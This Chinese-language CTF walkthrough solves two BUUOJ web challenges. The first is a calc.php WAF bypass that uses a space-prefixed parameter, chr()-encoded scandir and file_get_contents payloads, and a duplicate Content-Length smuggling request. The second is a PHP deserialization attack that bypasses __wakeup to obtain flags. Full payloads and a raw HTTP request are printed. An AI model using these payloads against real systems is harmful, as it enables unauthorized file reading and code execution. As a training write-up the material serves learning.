calc.php?num="+encodeURIComponent($("#content").val())
查看calc.php获取源码
如下：
$("#content").val() 是什么意思：
获取id为content的HTML标签元素的值,是JQuery,
$("#content")相当于document.getElementById(“content”); $("#content").val()相当于
document.getElementById(“content”).value;
但是无论怎么注入都是400,403和500，这里用的是一个新的点：PHP的字符串解析特性：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符
2.将某些字符转换为下划线（包括空格）当waf不让你过的时候，php却可以让你过
进行绕waf，当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。
num被限制了，但在num前面加个空格，waf就管不着了，因为waf只是限制了num，waf并没有限制’ num’，当php解析的时候，又会把’
num’前面的空格去掉在解析，利用这点来上传非法字符
构造payload来查看目录，用chr转化成ascll码进行绕过
这题存在高危漏洞，提示我们传递函数，拿flag
先扫描根目录下的所有文件，利用scandir()函数列出 参数目录 中的文件和目录
也就是scandir("/"),但是“/”被过滤了，所以我们用chr(“47”)绕过
calc.php?%20num=1;var_dump(scandir(chr(47)))
漏洞证明：
发现flagg文件，然后去读取这个文件
calc.php?
num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
得到flag{cd181f15-8fca-45b2-9a03-1d881341575b}
另一种方法，HTTP走私攻击
hackbar用POST方式构造payload进行请求：
    http://node3.buuoj.cn:26897/calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 
    num=phpinfo()
漏洞利用：
构造请求包如下：
    POST /calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) HTTP/1.1
    Host: node3.buuoj.cn:26897
    Content-Length: 17
    Content-Length: 17
    Cache-Control: max-age=0
    Origin: http://node3.buuoj.cn:26897
    Upgrade-Insecure-Requests: 1
    DNT: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://node3.buuoj.cn:26897/calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: session=c27a6db5-6635-4b96-9841-7e4d9fc76f0f.1itv3m9hNcEaFGPQCqcic-ppGHE
    Connection: close
    num=phpinfo%28%29
注意
得到flag：
## **15.[极客大挑战 2019]PHP**
访问url：
首页如下：
从题目名称上来看，是一道关于PHP的题目，然后首页又给出了提示，存在备份网站的习惯。
用御剑后台扫描工具进行扫描
访问url：
下载源文件
解压后包括以下文件：
    index.php
    flag.php
    class.php
    style.css
index.php
源码如下：
      I have a cat!
        因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
        不愧是我！！！
         Syclover @ cl4y
包含了class.php文件，并且以get方式获取select参数，然后将select的值进行反序列化（这里应该要用到序列化与反序列化）。
class.php源码，如下：
    username = $username;
            $this->password = $password;
        }
        function __wakeup(){
            $this->username = 'guest';
        }
        function __destruct(){
            if ($this->password != 100) {
                echo "NO!!!hacker!!!";
                echo "You name is: ";
                echo $this->username;echo "";
                echo "You password is: ";
                echo $this->password;echo "";
                die();
            }
            if ($this->username === 'admin') {
                global $flag;
                echo $flag;
            }else{
                echo "hello my friend~~sorry i can't give you the flag!";
                die();            
            }
        }
    }
    ?>
在这段代码的__destruct()方法中，发现了输出flag的代码，并且，执行条件是password==100，username===‘admin’。
接下来，就有考虑如何调用__destruct()方法了，这就用到了index.php中的反序列操作。
可以将序列化的Name对象作为select参数的值提交。当执行反序列化之后，又恢复成Name对象，并且，在Name对象销毁时，会自动调用__destruct()方法。
当时这里用个问题，就是在执行__destruct()方法之前，可能会先执行wakeup()方法，并且在wakeup()会修改username的值。
因此，这里应该绕过wakeup()方法，避免wakeup()执行。
这里存在一个CVE漏洞：当成员属性数目大于实际数目时可绕过wakeup方法
接下来可以开始构造php序列化对象，这里有两种方法：
（1）通过php脚本，将serialize($a)函数序列化的结果输出。脚本生成php序列化对象参考代码如下：
运行后结果：
O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
payload：
得到flag{89b1bbec-caf4-40ef-9f7f-6aa54620c140}
（2）private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字
段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度
于是我们再构造一回pyload:
?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
得到flag{89b1bbec-caf4-40ef-9f7f-6aa54620c140}
文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。
免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。
转载声明：儒道易行
拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。